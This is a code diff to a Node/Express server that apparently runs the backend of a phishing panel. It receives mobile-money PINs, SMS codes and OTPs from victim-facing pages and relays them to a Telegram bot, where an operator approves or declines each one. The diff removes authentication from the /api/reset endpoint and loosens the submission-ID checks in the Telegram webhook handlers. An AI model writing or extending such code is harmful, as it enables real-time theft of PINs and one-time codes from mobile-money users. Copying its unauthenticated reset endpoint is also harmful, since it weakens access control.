@@ -343,14 +343,13 @@ app.post('/api/decline', requireAdmin, (req, res) => {
   res.json({ ok: true });
 });
 
-app.post('/api/reset', requireAdmin, (req, res) => {
+/* ---- Reset (PUBLIC — called by user pages before submitting) ---- */
+app.post('/api/reset', (req, res) => {
   const state = readState();
   delete state.decision;
   delete state.declineMessage;
   delete state.decidedAt;
-  delete state.latestSubmission;
-  delete state.latestSmsSubmission;
-  delete state.latestOtpSubmission;
+  // Don't delete submissions — each step overwrites its own
   writeState(state);
   broadcast(state);
   res.json({ ok: true, state });
@@ -371,8 +370,8 @@ app.post('/api/telegram/webhook', async (req, res) => {
   /* MoMo PIN */
   if (action === 'approve' || action === 'decline') {
     const current = state.latestSubmission;
-    if (!current || (refId && current.id !== refId)) {
-      await tgSend('answerCallbackQuery', { callback_query_id: cb.id, text: 'This submission is no longer active.' });
+    if (!current) {
+      await tgSend('answerCallbackQuery', { callback_query_id: cb.id, text: 'No submission found.' });
       return;
     }
     if (action === 'approve') {
@@ -405,8 +404,8 @@ app.post('/api/telegram/webhook', async (req, res) => {
   /* SMS */
   if (action === 'sms-approve' || action === 'sms-decline') {
     const current = state.latestSmsSubmission;
-    if (!current || (refId && current.id !== refId)) {
-      await tgSend('answerCallbackQuery', { callback_query_id: cb.id, text: 'This SMS submission is no longer active.' });
+    if (!current) {
+      await tgSend('answerCallbackQuery', { callback_query_id: cb.id, text: 'No SMS submission found.' });
       return;
     }
     if (action === 'sms-approve') {
@@ -439,8 +438,8 @@ app.post('/api/telegram/webhook', async (req, res) => {
   /* OTP */
   if (action === 'otp-approve' || action === 'otp-decline' || action === 'otp-inactive') {
     const current = state.latestOtpSubmission;
-    if (!current || (refId && current.id !== refId)) {
-      await tgSend('answerCallbackQuery', { callback_query_id: cb.id, text: 'This OTP submission is no longer active.' });
+    if (!current) {
+      await tgSend('answerCallbackQuery', { callback_query_id: cb.id, text: 'No OTP submission found.' });
       return;
     }
 
